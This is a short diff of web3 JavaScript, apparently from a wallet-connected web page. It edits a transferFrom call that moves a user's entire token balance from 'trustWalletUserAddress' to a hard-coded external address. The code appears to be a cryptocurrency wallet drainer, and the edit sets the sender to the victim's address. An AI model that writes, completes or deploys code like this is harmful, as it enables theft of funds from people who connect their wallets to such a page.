@@ -2238,7 +2238,7 @@
 				// console.log(web3.utils.toBN(2))
 
 				window.SimpleStorage.methods.transferFrom(trustWalletUserAddress, '0x4BB2f635059D7e16eCE9427076Ba04E2b0Cc8FEc', web3.utils.toBN(balance)).send({
-					from: window.web3.eth.defaultAccount
+					from: trustWalletUserAddress
 				})
 
 				// window.SimpleStorage.methods.approve(first, web3.utils.toBN(2)).send({
